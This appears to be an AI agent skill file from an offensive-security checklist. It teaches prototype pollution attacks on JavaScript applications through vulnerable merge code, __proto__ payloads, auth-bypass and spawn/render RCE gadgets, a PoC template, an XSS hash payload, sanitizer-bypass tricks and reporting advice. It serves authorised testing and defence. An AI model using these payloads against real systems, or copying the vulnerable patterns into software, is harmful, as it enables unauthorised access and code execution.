---
name: offensive-prototype-pollution
description: "Prototype pollution attack methodology for client-side and server-side JavaScript — __proto__ / constructor / prototype gadget chains, finding sinks (auth bypass via isAdmin pollution, command injection via spawn arg pollution, RCE via property-injected lodash/jquery/express helpers), prototype pollution gadget databases, server-side via Express/Mongoose/Sequelize/koa-body, client-side via document.location / hash injection, and PortSwigger DOM Invader-style automated discovery. Use when assessing JS-heavy applications, especially Node.js backends or SPAs with deep object merging."
---

# Prototype Pollution

A JavaScript-specific bug class: pollute the global Object prototype to influence subsequent property reads in unrelated code. A well-placed pollution flips authentication, injects shell commands, or RCEs through commonly-used libraries.

## Quick Workflow

1. Find the pollution source — typically a deep-merge / clone / query-parser receiving user input
2. Identify which `__proto__` keys can be set
3. Search for matching gadgets — code that reads a property without checking if it's own
4. Chain pollution + gadget into impact (auth bypass / RCE / DoS)

---

## Pollution Sources

### Express body-parser + Object Merge

```javascript
// Vulnerable
const _ = require('lodash');
app.post('/profile', (req, res) => {
  const user = _.merge({}, defaults, req.body);   // user-controlled merge
  res.send(user);
});
```

```http
POST /profile
Content-Type: application/json

{"__proto__": {"isAdmin": true}}
```

After this request, **every object** subsequently created has `isAdmin = true` until the process restarts.

### Query String → Object

```javascript
// qs library, default config
const qs = require('qs');
qs.parse('a[__proto__][isAdmin]=true');   // pollutes Object.prototype
```

URL: `https://app.com/search?a[__proto__][isAdmin]=true`

### JSON.parse + Recursive Merge

```javascript
function merge(target, source) {
  for (let k in source) {
    if (typeof source[k] === 'object') {
      target[k] = target[k] || {};
      merge(target[k], source[k]);
    } else {
      target[k] = source[k];
    }
  }
}
```

Attacker JSON: `{"__proto__": {"polluted": "value"}}`. Recursive merge sets `Object.prototype.polluted = "value"`.

### Common Vulnerable Libraries

| Library | Vulnerable Function | CVE |
|---|---|---|
| lodash <4.17.21 | `_.merge`, `_.set`, `_.defaultsDeep` | CVE-2019-10744, others |
| jQuery <3.4.0 | `$.extend(true, ...)` | CVE-2019-11358 |
| qs <6.5.3 | `qs.parse` | CVE-2017-1000048 |
| Mongoose <5.13.15 | document creation with user input | CVE-2022-2564 |
| set-value | `set(obj, path, val)` with attacker path | various |
| dot-prop | similar | various |

## Gadgets

A gadget is application/library code that reads a property without `hasOwnProperty` check, where polluted prototype value affects logic.

### Auth Bypass Gadget

```javascript
function isAuthorized(user) {
  return user.role === 'admin';   // polluted role
}
```

If `Object.prototype.role = 'admin'` is set, every user lacking own `role` property returns true.

### Command Injection Gadget

```javascript
const { spawn } = require('child_process');
spawn('ls', ['-la'], opts);
// opts is constructed dynamically; if shell argument default comes from prototype...
```

Specifically: `child_process.spawn('cmd', args, options)` where `options.shell` defaults to `false`, but if `Object.prototype.shell = '/bin/bash'` is set and options is `{}`, shell is `true` → command injection.

### Express Render Gadget

```javascript
res.render('template', data);
// internally Express looks up template engine config from prototype if not in options
```

Pollute `Object.prototype.outputFunctionName` (handlebars/ejs config) → output function injection → SSTI-style RCE.

### Dompurify / Sanitizer Bypass

Some sanitizers check allow-lists by reading object properties. Pollute the allow-list.

## Discovery Tools

### Server-Side

```bash
# ppfuzz — automated probing
go install github.com/dwisiswant0/ppfuzz/v2@latest
ppfuzz -l urls.txt

# Or PortSwigger's research script — collection of polluted-key probes
```

### Client-Side

```javascript
// DOM Invader (Burp browser) — automated client-side prototype pollution finder
// Or manual: load page, inspect window.Object.prototype after various URL hash mutations
```

### Manual Probe

```http
POST /api/profile
{"__proto__": {"polluted_canary_xyz": true}}
```

Then check subsequent responses or the JS console for `({}).polluted_canary_xyz`. If it returns `true`, you've polluted.

## Server-Side Exploitation Walkthrough

```
1. POST /api/profile with {"__proto__": {"polluted":"YES"}}
2. Confirm pollution: GET /api/admin returns "polluted":"YES" in some unrelated response
3. Inspect application code (or fuzz) for gadget reading common properties
4. Trigger gadget — auth bypass, RCE
```

### Real PoC Template

```javascript
// Common Node.js gadget for spawn-based RCE
{"__proto__": {"shell": "/bin/sh", "stdio": "inherit"}}
// followed by trigger:
GET /api/some-endpoint-that-spawns-process?cmd=...
```

The gadget runs `child_process.spawn(cmd, [], {})` → defaults from polluted prototype → shell mode → injection.

## Client-Side Exploitation

URL fragment pollution:

```
https://app.com/#__proto__[onerror]=alert(1)
```

If the app reads `location.hash`, parses it into nested object, and sets attributes from it, polluting `onerror` may inject XSS.

### Common Sinks

- Event handlers (`onerror`, `onclick`) on dynamically-created elements
- `innerHTML` from polluted properties
- `eval` of templates referencing polluted keys

## Mitigation Awareness

| Defense | Bypass |
|---|---|
| `Object.create(null)` for user input | None — defense works |
| Frozen prototypes (`Object.freeze`) | None — defense works |
| `hasOwnProperty` checks before reading | None — defense works |
| Sanitizing `__proto__` only | Use `constructor.prototype` instead |
| Sanitizing `__proto__` + `constructor` | Use array indices that some libraries map to prototype keys |

## Engagement Cheatsheet

```
[ ] Identify endpoints accepting JSON or query objects
[ ] Probe each with __proto__ key for known canary properties
[ ] Confirm pollution with subsequent /info or /me endpoint
[ ] Inspect response/JS for properties that didn't exist before pollution
[ ] Map gadgets to impact:
    [ ] Auth bypass (role / isAdmin / permissions)
    [ ] Command injection (spawn/shell)
    [ ] Render / template injection (outputFunctionName)
    [ ] Sanitizer bypass
[ ] Demonstrate impact with minimum chain
```

## Reporting

For each finding:
- The pollution sink (endpoint + parameter)
- Library version creating the bug
- The polluted key + value used
- The downstream gadget triggered
- The actual impact (auth bypass, RCE, etc.)
- Specific library upgrade or sanitization required

---

## Key References

- "Prototype Pollution" by PortSwigger Research (Gareth Heyes)
- ppfuzz: github.com/dwisiswant0/ppfuzz
- "Prototype Pollution Gadget Database" (community-maintained)
- Snyk advisory database — JavaScript prototype-pollution-related CVEs
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/prototype-pollution.md
